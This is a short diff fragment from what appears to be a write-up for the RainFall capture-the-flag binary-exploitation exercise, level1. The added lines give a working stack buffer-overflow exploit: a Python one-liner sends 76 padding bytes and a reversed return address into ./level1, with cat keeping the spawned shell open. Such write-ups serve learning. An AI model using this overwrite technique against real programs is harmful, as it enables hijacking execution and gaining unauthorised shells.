@@ -23,3 +23,5 @@ After some searchs, we found that the address that we will need to use for the e
 
 We will have to enter it reversly
 ```bash
+level1@RainFall:~$ (python -c "print('a' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
+```
